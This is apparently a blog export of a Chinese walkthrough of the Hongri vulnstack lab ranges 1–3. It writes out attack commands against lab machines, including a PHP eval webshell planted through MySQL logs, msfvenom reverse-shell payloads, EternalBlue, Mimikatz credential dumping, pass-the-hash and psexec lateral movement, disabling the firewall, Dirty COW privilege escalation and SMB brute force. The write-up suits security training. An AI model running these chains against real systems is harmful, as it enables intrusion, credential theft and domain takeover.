<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>红日靶场</title>
      <link href="/2024/10/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/"/>
      <url>/2024/10/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="红日靶场"><a href="#红日靶场" class="headerlink" title="红日靶场"></a>红日靶场</h1><h2 id="红日1"><a href="#红日1" class="headerlink" title="红日1"></a>红日1</h2><h3 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h3><p><a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">下载</a></p><p><img src="https://bu.dusays.com/2024/10/11/6709367c514d4.png" alt="image-20240718223405563"></p><p><img src="https://bu.dusays.com/2024/10/11/6709367c896a3.png" alt="image-20240718223419984"></p><p>下下来解压</p><p><img src="https://bu.dusays.com/2024/10/11/6709367c2fe52.png" alt="image-20240719204707266"></p><p>拓扑图：</p><p><img src="https://bu.dusays.com/2024/10/11/670936895c768.png" alt="image-20240828174621737"></p><p>VM启动</p><p><img src="https://bu.dusays.com/2024/10/11/6709367bb7f87.png" alt="image-20240719205315322"></p><p>靶场默认密码<br>hongrisec@2019</p><p>打开靶机</p><p>win7 开phpstudy</p><p>ip:</p><p>win7(web服务器) 10.4.7.205  192.168.52.130</p><p>win2008(域控) 192.168.52.138</p><p>win2003(域主机) 192.168.52.141</p><p>要给win7配双网卡</p><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><h4 id="外网"><a href="#外网" class="headerlink" title="外网"></a>外网</h4><p>扫描一下</p><p><code>nmap -sS -sV -Pn 10.4.7.205</code>  </p><p><img src="https://bu.dusays.com/2024/10/11/67093689070e3.png" alt="image-20240828221908138"></p><p>开放445可能有永恒之蓝漏洞</p><p>3306对应mysal</p><p>3389远程桌面连接</p><p>dirsearch也扫下吧</p><p><code>dirsearch -u http://10.4.7.205</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709368873505.png" alt="image-20240828222151624"></p><p>我们访问一下这个phpMyAdmin</p><p><img src="https://bu.dusays.com/2024/10/11/6709367c97c27.png" alt="image-20240828222329898"></p><p>一个登录接口</p><p>尝试mysql常用账号密码登录</p><p>最后发现账号密码是root  root</p><p>登录</p><p><img src="https://bu.dusays.com/2024/10/11/6709367f3a091.png" alt="image-20240828222533915"></p><p>到变量这里查看</p><p>查看数据库是否可以写入–sucure_file_priv是否为null</p><p>查询之后为NULL，所以不能写入</p><p>不行的话我们就试下日志马</p><h5 id="日志马"><a href="#日志马" class="headerlink" title="日志马"></a>日志马</h5><p>先看下有没有权限</p><p>查这个–general_log</p><p><img src="https://bu.dusays.com/2024/10/11/6709367dc275a.png" alt="image-20240828223536507"></p><p>off也无所谓 我们可以改</p><p><code>SET GLOBAL general_log=&#39;ON&#39;;</code></p><p>到sql这里来执行</p><p><img src="https://bu.dusays.com/2024/10/11/6709367d7976a.png" alt="image-20240828223728242"></p><p>没问题 已经改了</p><p><img src="https://bu.dusays.com/2024/10/11/6709367caafb8.png" alt="image-20240828223750556"></p><p>我们指定日志写入到网站根目录 这样方便蚁剑能直接连接到</p><p><code>set GLOBAL general_log_file=&#39;C:/phpStudy/WWW/shell1.php&#39;</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709367ec60fb.png" alt="image-20240828224101643"></p><p>成功</p><p><img src="https://bu.dusays.com/2024/10/11/6709367c2234d.png" alt="image-20240828224118539"></p><p>现在我们就sql写马到日志文件就行</p><p><code>select &#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709367ceb5e7.png" alt="image-20240828224356851"></p><p>好 蚁剑连接</p><p><img src="https://bu.dusays.com/2024/10/11/6709367f4b76c.png" alt="image-20240828224459083"></p><p>进去后发现yxcms 考虑它是不是还搭建了一个yxcms</p><p><img src="https://bu.dusays.com/2024/10/11/6709367c0fa4b.png" alt="image-20240828224605796"></p><p>看下能不能直接访问</p><p><img src="https://bu.dusays.com/2024/10/11/670936870190c.png" alt="image-20240828224659277"></p><p>可以</p><p>回到蚁剑</p><p>先看下我们的权限吧</p><p><img src="https://bu.dusays.com/2024/10/11/6709367c09056.png" alt="image-20240828224840699"></p><p>管理员权限</p><p>查下ip</p><p><img src="https://bu.dusays.com/2024/10/11/6709367ed10d5.png" alt="image-20240828224935726"></p><p>是域用户 且有两个ip</p><p>可能有其他域主机</p><p>信息收集一下</p><p><code>net view</code></p><p><code>net user</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709367c7f48c.png" alt="image-20240828225213164"></p><p>可以看到</p><p>本机名是ABC</p><p>还有2个域主机</p><p><code>systeminfo</code></p><p>看下</p><p><img src="https://bu.dusays.com/2024/10/11/670936814e667.png" alt="image-20240828225358574"></p><h4 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h4><h5 id="CS上线"><a href="#CS上线" class="headerlink" title="CS上线"></a>CS上线</h5><p>CS上线一下</p><p><img src="https://bu.dusays.com/2024/10/11/6709368150121.png" alt="image-20240828225633787"></p><p>连接服务器</p><p><img src="https://bu.dusays.com/2024/10/11/6709367c84c94.png" alt="image-20240828225739438"></p><p>监听</p><p><img src="https://bu.dusays.com/2024/10/11/67093680af1c1.png" alt="image-20240828225816931"></p><p>CS生成一个木马传到目标服务器</p><p><img src="https://bu.dusays.com/2024/10/11/67093686c8e9c.png" alt="image-20240828230040631"></p><p>上线</p><p>我们查一下域内其他主机呢</p><p><code>net view</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709367c7a5fb.png" alt="image-20240828230342326"></p><p>ip有了</p><p>CS的beacon反弹shell自带Mimikatz套件</p><p>我们用这个抓一下hash密码</p><p><code>logonpasswords</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709368143e5a.png" alt="image-20240828230609954"></p><p>好</p><h5 id="msf上线"><a href="#msf上线" class="headerlink" title="msf上线"></a>msf上线</h5><p>我们把这个会话转给msf</p><p>也可以直接msf监听啊 反正也没有权限</p><p>先生成一个木马</p><p><img src="https://bu.dusays.com/2024/10/11/670936808adf2.png" alt="image-20240828230820830"></p><p>msf开监听</p><p>然后蚁剑运行一下shell.exe</p><p><img src="https://bu.dusays.com/2024/10/11/67093687eb7f2.png" alt="image-20240828230957852"></p><p>上线</p><p>msf看下内网端口开放情况</p><p><code>use auxiliary/scanner/portscan/tcp</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709368955eb1.png" alt="image-20240828231439334"></p><p>看到两个ip都开放了445端口</p><p>应该是可以打一个永恒之蓝</p><h5 id="永恒之蓝"><a href="#永恒之蓝" class="headerlink" title="永恒之蓝"></a>永恒之蓝</h5><p><code>search ms010_17</code></p><p><img src="https://bu.dusays.com/2024/10/11/670936874ea61.png" alt="image-20240828231702732"></p><p>找一个打吧</p><p>上次是用了第一个</p><p>这次用下第三个吧</p><p><code>use 3</code></p><p><code>set rhost 192.168.52.138</code></p><p>打不下来</p><p><img src="https://bu.dusays.com/2024/10/11/6709368143a03.png" alt="image-20240828232307085"></p><p>打一下192.168.52.141呢</p><p>也不行</p><p>不会了</p><p>先打到这吧</p><p>再学学再来</p><p>好又学了一种方法</p><h5 id="哈希传递PTH"><a href="#哈希传递PTH" class="headerlink" title="哈希传递PTH"></a>哈希传递PTH</h5><p>上面既然通过永恒之蓝漏洞难以获得域控主机的 Shell，那就换一种攻击思路拿下域控吧，下面尝试通过哈希传递攻击 PTH 拿下域控主机</p><blockquote><p>[哈希传递攻击]在 <code>kerberos</code>、<code>NTLM </code>认证过程的关键，首先就是基于用户密码 Hash 的加密，所以在域渗透中，无法破解用户密码 Hash 的情况下，也可以直接利用 Hash 来完成认证，达到攻击的目的，这就是 hash 传递攻击Pass The Hash**，简称 **PTH）</p><p>如果<strong>内网主机的本地管理员账户密码相同</strong>，那么可以通过 <strong>PTH</strong> 远程登录到任意一台主机，操作简单、威力无穷。</p></blockquote><p>利用过程</p><ul><li>先获得一台域主机的权限，dump内存获得该主机的用户密码hash值</li><li>通过hash传递攻击尝试登录其他主机</li><li>获取域管理员账户hash,登录域控，最终控制整个域</li></ul><p>之前我们已经获得了所有用户的hash了</p><p>好</p><p>接下来</p><p>我们用cs再生成一个监听器 <strong>payload用Beacon SMB</strong></p><p><img src="https://bu.dusays.com/2024/10/11/6709367d3ff47.png" alt="image-20240828233748472"></p><p>再添加一个会话</p><p>payload选我们设置的smbjiantingq</p><p><img src="https://bu.dusays.com/2024/10/11/6709367d85382.png" alt="image-20240828233852957"></p><p>点击瞄准镜图标可以看到三台主机</p><p>然后用这个模块psexec</p><p><img src="https://bu.dusays.com/2024/10/11/6709367c724c7.png" alt="image-20240828234009251"></p><p>配置一下</p><p><img src="https://bu.dusays.com/2024/10/11/6709367ed14b5.png" alt="image-20240828234104493"></p><p>可以两个主机都打一下</p><p><img src="https://bu.dusays.com/2024/10/11/67093687e9881.png" alt="image-20240828234242638"></p><p>两个主机都上线</p><p>拿下</p><h2 id="红日2"><a href="#红日2" class="headerlink" title="红日2"></a>红日2</h2><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>靶机通用密码：1qaz@WSX</p><p>拓扑图</p><p><img src="https://bu.dusays.com/2024/10/11/670936a88d9a9.png" alt="image-20240829203829259"></p><p><img src="https://bu.dusays.com/2024/10/11/670936a75ee55.png" alt="image-20240829204750455"></p><h4 id="web-de1ay-com"><a href="#web-de1ay-com" class="headerlink" title="web.de1ay.com"></a>web.de1ay.com</h4><p>nat改成111网段</p><p>网卡2改成10网段</p><p><img src="https://bu.dusays.com/2024/10/11/670936a99513f.png" alt="image-20240829204327006"></p><p>打开后重置一下快照1.3</p><p><img src="https://bu.dusays.com/2024/10/11/670936a87e7d1.png" alt="image-20240829204923982"></p><p>进去之后进到这个目录下面,无权限时可以输入我们设置的管理员账号密码</p><p><img src="https://bu.dusays.com/2024/10/11/670936ac92d52.png" alt="image-20240829205351774"></p><p>还要到这个目录下开下这个服务</p><p><code>C:\Oracle\Middleware\user_projects\domains\base_domain\</code></p><p><img src="https://bu.dusays.com/2024/10/11/670936b157bee.png" alt="image-20240829205724236"></p><h4 id="PC-de1ay-com"><a href="#PC-de1ay-com" class="headerlink" title="PC.de1ay.com"></a>PC.de1ay.com</h4><p>一样的</p><p><img src="https://bu.dusays.com/2024/10/11/670936aaea7b6.png" alt="image-20240829204431159"></p><h4 id="DC-de1ay-com"><a href="#DC-de1ay-com" class="headerlink" title="DC.de1ay.com"></a>DC.de1ay.com</h4><p>只有10网段的</p><p><img src="https://bu.dusays.com/2024/10/11/670936a8c8d89.png" alt="image-20240829204606856"></p><p>weblogic:192.168.111.80  10.10.10.80</p><p>pc: 10.10.10.201  192.168.111.201</p><p>DC:10.10.10.10</p><h3 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h3><h4 id="外网-1"><a href="#外网-1" class="headerlink" title="外网"></a>外网</h4><p>扫描一下</p><p><code>arp-scan -l</code></p><p><img src="https://bu.dusays.com/2024/10/11/670936b5cbca1.png" alt="image-20240830021220252"></p><p>发现两个ip</p><p>具体扫下</p><p><code>nmap -Pn -A -p- 192.168.111.80</code></p><p><img src="https://bu.dusays.com/2024/10/11/670936c041cb7.png" alt="image-20240830021816807"></p><ul><li><p>445端口开放意味着存在smb服务，可能存在ms17_010永恒之蓝漏洞。</p></li><li><p>开放139端口，就存在Samba服务，可能存在爆破&#x2F;未授权访问&#x2F;远程命令执行漏洞。</p></li><li><p>放1433端口，就存在mssql服务，可能存在爆破&#x2F;注入&#x2F;SA弱口令。</p></li><li><p>开放7001端口可能存在Weblogic反序列化漏洞。</p></li></ul><p>我们先访问一下呢</p><p><img src="https://bu.dusays.com/2024/10/11/670936a8bfdeb.png" alt="image-20240830022111732"></p><p>这是一个weblogic的报错页面</p><p>我们可以用weblogic漏洞扫描工具扫一下</p><p><a href="https://github.com/dr0op/WeblogicScan.git">weblogic</a></p><p><code>python WeblogicScan.py 192.168.111.80 7001</code></p><p><img src="https://bu.dusays.com/2024/10/11/670936bf17cf5.png" alt="image-20240830030337604"></p><p>看到扫出后台路径访问一下</p><blockquote><p>192.168.111.80:7001&#x2F;console</p></blockquote><p><img src="https://bu.dusays.com/2024/10/11/670936b227963.png" alt="image-20240830023049382"></p><p>尝试弱密码爆破</p><p>不行</p><p>在weblogicscan扫描的时候有很多的漏洞可以利用</p><p>这里我们使用CVE-2019-2725</p><p>用msf</p><p><code>search cve-2019-2725</code></p><p><img src="https://bu.dusays.com/2024/10/11/670936b816b6d.png" alt="image-20240830030444727"></p><p>就一个 用就完事了</p><p>呃 不行 连不上 </p><p><img src="https://bu.dusays.com/2024/10/11/670936bc6cf88.png" alt="image-20240830134342957"></p><p>用工具吧</p><p><img src="https://bu.dusays.com/2024/10/11/670936b05d809.png" alt="image-20240830135519335"></p><p>上传一个jsp木马</p><p><img src="https://bu.dusays.com/2024/10/11/670936b057593.png" alt="image-20240830140343501"></p><p>哥斯拉连接</p><p><img src="https://bu.dusays.com/2024/10/11/670936ab249c6.png" alt="image-20240830140455642"></p><p><img src="https://bu.dusays.com/2024/10/11/670936a91bac2.png" alt="image-20240830140529703"></p><h4 id="内网-1"><a href="#内网-1" class="headerlink" title="内网"></a>内网</h4><h5 id="msf上线-1"><a href="#msf上线-1" class="headerlink" title="msf上线"></a>msf上线</h5><p>上线哥斯拉后我们就可以上线msfl</p><p>msf先生成一个木马</p><p><code>msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.111.128 LPORT=1234 -f exe -o /hacker.exe</code></p><p><img src="https://bu.dusays.com/2024/10/11/670936bcb36bc.png" alt="image-20240830140939859"></p><p>哥斯拉上传到目标主机</p><p><img src="https://bu.dusays.com/2024/10/11/670936aebdc5b.png" alt="image-20240830141153400"></p><p>msf监听</p><p><code>use exploit/multi/handler</code><br><code>set payload windows/x64/meterpreter_reverse_tcp</code><br><code>set lhost 192.168.111.128</code><br><code>set lport 1234</code></p><p><code>run</code></p><p><img src="https://bu.dusays.com/2024/10/11/670936bd55ac2.png" alt="image-20240830141456278"></p><p>哥斯拉运行木马文件</p><p>上线</p><p><img src="https://bu.dusays.com/2024/10/11/670936bfce3a8.png" alt="image-20240830141640396"></p><p>尝试getsystem</p><p><img src="https://bu.dusays.com/2024/10/11/670936ac27a86.png" alt="image-20240830142315276"></p><p>失败</p><h5 id="socks代理扫描内网"><a href="#socks代理扫描内网" class="headerlink" title="socks代理扫描内网"></a>socks代理扫描内网</h5><p>先把他放到后台</p><p>然后添加一个10.10.10.0&#x2F;24段的路由</p><p><code>route add 10.10.10.0 255.255.255.0 1</code><br><code>route print</code></p><p><img src="https://bu.dusays.com/2024/10/11/670936b6535af.png" alt="image-20240830142654098"></p><p>使用socks路由把msf带入内网，需要在proxychains.conf里面添加路由</p><p><code>use auxiliary/server/socks_proxy</code><br><code>set version 4a</code><br><code>run</code></p><p><img src="https://bu.dusays.com/2024/10/11/670936b03c574.png" alt="image-20240830144339758"></p><p>arp探测内网存活主机</p><p><code>use post/windows/gather/arp_scanner</code><br><code>set RHOSTS 10.10.10.0/24</code><br><code>set SESSION 1</code><br><code>exploit</code></p><p><img src="https://bu.dusays.com/2024/10/11/670936b22cfbd.png" alt="image-20240830150103365"></p><p>看到扫到内网ip</p><p>nmap扫下这两个ip</p><p>但是什么都没扫出来</p><h5 id="永恒之蓝-1"><a href="#永恒之蓝-1" class="headerlink" title="永恒之蓝"></a>永恒之蓝</h5><p>端口开放了455</p><p>打一下永恒之蓝呢</p><p>扫描一下能不能够通过漏洞直接进行横向移动</p><p><code>use auxiliary/scanner/smb/smb_ms17_010</code><br><code>set rhost 10.10.10.0/24</code><br><code>set threads 5</code><br><code>run</code></p><p><img src="https://bu.dusays.com/2024/10/11/670936b305afe.png" alt="image-20240830151420791"></p><p>确实有永恒之蓝，打一下，但是会话不能产生</p><h5 id="CS上线-1"><a href="#CS上线-1" class="headerlink" title="CS上线"></a>CS上线</h5><p>这样的话我们就把会话转接给CS</p><p>使用<code>payload-inject</code>把<code>msf</code>的对话派生给<code>cs</code></p><p><code>use exploit/windows/local/payload_inject</code><br><code>set PAYLOAD windows/meterpreter/reverse_http</code><br><code>set DisablePayloadHandler true</code><br><code>set LHOST 192.168.111.128</code><br><code>set LPORT 5555</code><br><code>set SESSION 1</code><br><code>run</code></p><p>开CS服务器</p><p>客户端连接</p><p>CS开监听</p><p><img src="https://bu.dusays.com/2024/10/11/670936aa666ea.png" alt="image-20240830152202716"></p><p>呃好像有点问题</p><p>那就msf转会话给cs吧</p><p>上线</p><p><img src="https://bu.dusays.com/2024/10/11/670936a9d8c95.png" alt="image-20240830152040470"></p><h5 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h5><p>直接cs脚本梼杌</p><p>使用ms014-058进行提权成功</p><p><img src="https://bu.dusays.com/2024/10/11/670936a75ad39.png" alt="image-20240830152958799"></p><p>获得system权限</p><p>run mimikatz抓下hash</p><p><img src="https://bu.dusays.com/2024/10/11/670936abb0c27.png" alt="image-20240830153219401"></p><p>关闭防火墙</p><blockquote><p>shell netsh advfirewall show all state    &#x2F;&#x2F;查看防火墙状态<br>shell netsh advfirewall set allprofile state off  &#x2F;&#x2F;关闭防火墙</p></blockquote><h5 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h5><p>还是用hash传递攻击吧</p><p><img src="https://bu.dusays.com/2024/10/11/670936a8ef4d7.png" alt="image-20240830153912877"></p><p>DC上线</p><p><img src="https://bu.dusays.com/2024/10/11/670936a8e18c8.png" alt="image-20240830154017064"></p><p>且权限为system</p><p><img src="https://bu.dusays.com/2024/10/11/670936ab5f133.png" alt="image-20240830154042574"></p><h2 id="红日3"><a href="#红日3" class="headerlink" title="红日3"></a>红日3</h2><h3 id="环境配置-1"><a href="#环境配置-1" class="headerlink" title="环境配置"></a>环境配置</h3><p>和上面的差不多</p><p>网卡2–&gt;93网段</p><p>再将所有机器全部开机</p><p>web-centos要重启一下网卡</p><p>拓扑图</p><p><img src="https://bu.dusays.com/2024/10/11/670936e037de7.png" alt="image-20240830160144063"></p><p>因为是黑盒测试</p><p>所以没有密码</p><p>目标是拿到域控中的一份重要文件</p><h3 id="攻击-2"><a href="#攻击-2" class="headerlink" title="攻击"></a>攻击</h3><h4 id="外网-2"><a href="#外网-2" class="headerlink" title="外网"></a>外网</h4><p>还是扫描吧</p><p><code>sudo nmap -PR 10.0.0.0/24</code></p><p><img src="https://bu.dusays.com/2024/10/11/670936e9b93b5.png" alt="image-20240830160536805"></p><p>看到有VM的ip</p><p>确定这是我们需要的地址</p><p>具体扫下</p><p><code>sudo nmap 10.0.0.13 -sC -sV</code></p><p><img src="https://bu.dusays.com/2024/10/11/670936f3e6044.png" alt="image-20240830160714883"></p><p>开了3306的mysql</p><p>80开的是joomla</p><p>访问一下</p><p><img src="https://bu.dusays.com/2024/10/11/670936e290b7f.png" alt="image-20240830160841635"></p><p>dirsearch扫下</p><p>扫出来很多啊</p><p><img src="https://bu.dusays.com/2024/10/11/670936dfb37ed.png" alt="image-20240830161227653"></p><p>我们先看看robots.txt</p><p><img src="https://bu.dusays.com/2024/10/11/670936e065408.png" alt="image-20240830161156143"></p><p>发现可疑目录</p><p>10.0.0.13&#x2F;administrator</p><p>访问一下</p><p><img src="https://bu.dusays.com/2024/10/11/670936e02a823.png" alt="image-20240830161342921"></p><p>发现一个登录接口</p><p>尝试弱口令 不行 爆破 不行</p><p>dirsearch还扫出来一下东西</p><p><img src="https://bu.dusays.com/2024/10/11/670936e63ad67.png" alt="image-20240830161523300"></p><p>我们看看这个1.php</p><p><img src="https://bu.dusays.com/2024/10/11/670936eebf7b4.png" alt="image-20240830161555949"></p><p>发现是一个phpinfo</p><p>有写文件的路径</p><p><img src="https://bu.dusays.com/2024/10/11/670936dfe9533.png" alt="image-20240830161702018"></p><p>还有禁用了一些函数</p><p><img src="https://bu.dusays.com/2024/10/11/670936e05162b.png" alt="image-20240830161745204"></p><p>2.php没有什么有用的信息</p><p>在回头看看我们的dirsearch扫没扫出什么可疑路径</p><p><img src="https://bu.dusays.com/2024/10/11/670936f22dd02.png" alt="image-20240830161905084"></p><p>发现这个10.0.0.13&#x2F;configuration.php 可能是一个备份文件</p><p>看下</p><p><img src="https://bu.dusays.com/2024/10/11/670936f32e64a.png" alt="image-20240830161958572"></p><p>ctul+u看下网页源代码</p><p><img src="https://bu.dusays.com/2024/10/11/670936eb6455e.png" alt="image-20240830162040039"></p><p>好像是个数据库</p><p>泄露了一个mysql用户密码</p><p>并且他是开了3306端口的</p><p>尝试3306登录呢</p><p><code>mysql -h 10.0.0.13 -u testuser -p</code></p><p><img src="https://bu.dusays.com/2024/10/11/670936e3177f3.png" alt="image-20240830162341381"></p><p>看下数据库呢</p><p><code>show databases;</code></p><p><img src="https://bu.dusays.com/2024/10/11/670936e421d48.png" alt="image-20240830162507509"></p><p>进joomla看下表</p><p><code>use joomla;</code></p><p><code>show tables;</code></p><p><img src="https://bu.dusays.com/2024/10/11/670936e4efcc5.png" alt="image-20240830162722473"></p><p>有两个前缀</p><p>-am2zu</p><p>-umnbt</p><p>而我们在备份文件中看到的是在am2zu里</p><p>找到可疑表</p><p><img src="https://bu.dusays.com/2024/10/11/670936e0719f1.png" alt="image-20240830162908007"></p><p>进去看一下</p><p><code>select * from am2zu_users;</code></p><p><img src="https://bu.dusays.com/2024/10/11/670936ed7b0ba.png" alt="image-20240830162956166"></p><p>看到权限是super user</p><p>有加密的密码</p><p>尝试用john跑一下</p><p>不行</p><p>因为我们权限很高 那我们就尝试修改密码</p><p><code>update am2zu_users set password = md5(&quot;123456&quot;) where id =891;</code></p><p><img src="https://bu.dusays.com/2024/10/11/670936e194598.png" alt="image-20240830163508478"></p><p><img src="https://bu.dusays.com/2024/10/11/670936e8b830f.png" alt="image-20240830163520100"></p><p>成功</p><p>回到后台 尝试登录</p><p><img src="https://bu.dusays.com/2024/10/11/670936e08ea11.png" alt="image-20240830163638995"></p><p>成功</p><p><img src="https://bu.dusays.com/2024/10/11/670936e1b3e29.png" alt="image-20240830163651624"></p><p>DC打过这个</p><p>在templates里面可以任意文件上传</p><p><img src="https://bu.dusays.com/2024/10/11/670936ec52bc8.png" alt="image-20240830163919409"></p><p>随便插入一个一句话木马</p><p>访问一下</p><p><img src="https://bu.dusays.com/2024/10/11/670936e024200.png" alt="image-20240830164035028"></p><p>没问题</p><p>蚁剑连接</p><p><img src="https://bu.dusays.com/2024/10/11/670936e0ddb8c.png" alt="image-20240830164109546"></p><p>成功</p><p>尝试执行命令</p><p><img src="https://bu.dusays.com/2024/10/11/670936e503d6e.png" alt="image-20240830164145123"></p><p>不行 完全没有回显</p><p>这是因为把eval给禁了</p><p>试试用蚁剑的插件来绕</p><p>到蚁剑的插件市场找一个</p><p><img src="https://bu.dusays.com/2024/10/11/670936e0327a0.png" alt="image-20240830164535793"></p><p><img src="https://bu.dusays.com/2024/10/11/670936e441972.png" alt="image-20240830164613798"></p><p>选择PHP7_UserFilter模式绕过</p><p><img src="https://bu.dusays.com/2024/10/11/670936e46cab1.png" alt="image-20240830164710292"></p><p>成功</p><h4 id="内网-2"><a href="#内网-2" class="headerlink" title="内网"></a>内网</h4><h5 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h5><p><img src="https://bu.dusays.com/2024/10/11/670936e31ac7c.png" alt="image-20240830164736152"></p><p>看下ip呢</p><p><img src="https://bu.dusays.com/2024/10/11/670936ec79dcc.png" alt="image-20240830165005253"></p><p>192.168.93.120</p><p>说明是个出网主机 有内网</p><p>上传fscan扫描一下</p><p><img src="https://bu.dusays.com/2024/10/11/670936e5de899.png" alt="image-20240830165348936"></p><p>DC也扫出来了</p><p><img src="https://bu.dusays.com/2024/10/11/670936e571499.png" alt="image-20240830165416669"></p><p>所以</p><p>DC:192.168.93.10</p><p>WIN2008: 192.168.93.20</p><p>WIN7: 192.168.93.30</p><p>还要之前mysql的root密码</p><p><img src="https://bu.dusays.com/2024/10/11/670936e0748f4.png" alt="image-20240830165609569"></p><p>呃 win2008还开了一个mssql的1433</p><p><img src="https://bu.dusays.com/2024/10/11/670936e034bc1.png" alt="image-20240830170123908"></p><p>之前我们在备份文件中还有一对账号密码</p><p><img src="https://bu.dusays.com/2024/10/11/670936e196fc1.png" alt="image-20240830170535311"></p><p>正好它还开了ssh</p><p>尝试登录一下</p><p><code>ssh wwwuser@10.0.0.13</code></p><p><img src="https://bu.dusays.com/2024/10/11/670936e44c3de.png" alt="image-20240830170619506"></p><p>好像失败了</p><p>搜下</p><p>需要这样</p><p><img src="https://bu.dusays.com/2024/10/11/670936e36c300.png" alt="image-20240830170705006"></p><p>登录成功</p><p><code>ssh wwwuser@10.0.0.13 -oHostKeyAlgorithms=+ssh-dss </code></p><p><img src="https://bu.dusays.com/2024/10/11/670936e502019.png" alt="image-20240830170746465"></p><p>看下ip</p><p><img src="https://bu.dusays.com/2024/10/11/670936f55f43f.png" alt="image-20240830170835608"></p><p>没问题</p><p>看下系统版本呢</p><p><code>uname -a</code></p><p><code>cat /etc/*-re*</code></p><p><img src="https://bu.dusays.com/2024/10/11/670936ea6750e.png" alt="image-20240830170933257"></p><p>看到它系统内核版本比较低</p><p>考虑脏牛提权</p><p>先看下sudo提权呢 </p><p><code>sudo -l</code></p><p><img src="https://bu.dusays.com/2024/10/11/670936f2cf9f0.png" alt="image-20240830171105157"></p><p>不行</p><p>那就脏牛吧</p><p>看下目标主机上有没有gcc</p><p><code>whereis gcc</code></p><p><img src="https://bu.dusays.com/2024/10/11/670936e6eb24e.png" alt="image-20240830171306622"></p><p>有哈 </p><p>把脏牛的C文件放到目标主机上来</p><p>看下有没有wget</p><p><code>whereis wget</code></p><p><img src="https://bu.dusays.com/2024/10/11/670936e883a45.png" alt="image-20240830171751222"></p><p>也有</p><p>那就用python建立一下连接</p><p><code>python3 -m http.server 80</code></p><p><img src="https://bu.dusays.com/2024/10/11/670936e52a1c9.png" alt="image-20240830171846194"></p><p>靶机wget一下</p><p><code>wget 10.0.0.93/dirty.c</code></p><p><img src="https://bu.dusays.com/2024/10/11/670936ecc0078.png" alt="image-20240830172010316"></p><p>编译一下</p><p><code>gcc -pthread dirty.c -o dirty -lcrypt</code></p><p><img src="https://bu.dusays.com/2024/10/11/670936f3221ad.png" alt="image-20240830172155432"></p><p>没问题</p><p>有执行权限</p><p><code>./dirty</code>运行一下</p><p><img src="https://bu.dusays.com/2024/10/11/670936e8bb17a.png" alt="image-20240830172402446"></p><p>脏牛提权就是向etc&#x2F;passwd里添加这条命令 </p><p>这条命令有我们新设置的账号密码</p><p>Linux会先到etc&#x2F;passwd里找有没有登录用的账号密码</p><p>没找到的话再到etc&#x2F;shadow里面找</p><p><img src="https://bu.dusays.com/2024/10/11/670936e815a7a.png" alt="image-20240830172700356"></p><p>看到已经写入成功了</p><p>那就</p><p><code>su firefart</code></p><p><img src="https://bu.dusays.com/2024/10/11/670936e801071.png" alt="image-20240830172805986"></p><p>可以看到权限为root</p><h5 id="msf上线-2"><a href="#msf上线-2" class="headerlink" title="msf上线"></a>msf上线</h5><p>都有了root权限了</p><p>其实感觉上不上线都无所谓了</p><p>但是为了横向移动的时候方便移动 还是要上线msf</p><p>msf生成木马文件</p><p><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.13 LPORT=1106 SessionCommunicationTimeout=0 SessionExpirationTimeout=0 -f elf &gt; shell.elf</code></p><p>msf开监听</p><p><code>use exploit/multi/handler</code></p><p><code>set payload linux/x64/meterpreter/reverse_tcp</code></p><p><code>set LHOST 10.0.0.13</code></p><p><code>set LPORT 1106</code></p><p><code>run</code></p><h5 id="smb爆破"><a href="#smb爆破" class="headerlink" title="smb爆破"></a>smb爆破</h5><p>因为开了445端口 尝试一下smb爆破</p><p>先爆win7</p><p><code>use auxiliary/scanner/smb/smb_login</code></p><p><code>set RHOSTS 192.168.93.30</code></p><p><code>set pass_file /home/kali/Dsektop/1.txt</code></p><p><code>set SMBUser administrator</code> </p><p><code>run</code></p><p><img src="https://bu.dusays.com/2024/10/11/670936ed33ad2.png" alt="image-20240830175144268"></p><p>密码是123qwe!ASD</p><p>DC:</p><p>一样的</p><p><img src="https://bu.dusays.com/2024/10/11/670936ecdf18b.png" alt="image-20240830175305122"></p><p>一样的密码</p><p>win2008也是一样的</p><h5 id="psexec攻击"><a href="#psexec攻击" class="headerlink" title="psexec攻击"></a>psexec攻击</h5><p><code>search psexec</code></p><p><code>use 4</code></p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240830175444879.png" alt="image-20240830175444879"></p><p><code>set SMBUSER administrator</code></p><p><code>set SMBPASS 123qwe!ASD</code></p><p><img src="https://bu.dusays.com/2024/10/11/670936e9502a4.png" alt="image-20240830175619946"></p><p><code>set payload windows/x64/meterpreter/bind_tcp</code></p><p><code>set RHOSTS 192.168.93.20</code></p><p><code>exploit</code></p><p><img src="https://bu.dusays.com/2024/10/11/670936f559fa0.png" alt="image-20240830175915290"></p><p>成功</p><p><img src="https://bu.dusays.com/2024/10/11/670936e3e9358.png" alt="image-20240830180006451"></p><p>权限是系统权限</p><p><strong>同理可以用psexec连接win7</strong></p><h5 id="mimikatz抓密码"><a href="#mimikatz抓密码" class="headerlink" title="mimikatz抓密码"></a>mimikatz抓密码</h5><p><code>load kiwi</code></p><p><img src="https://bu.dusays.com/2024/10/11/670936ecd1149.png" alt="image-20240830180330251"></p><p><code>creds_kerberos</code></p><p><img 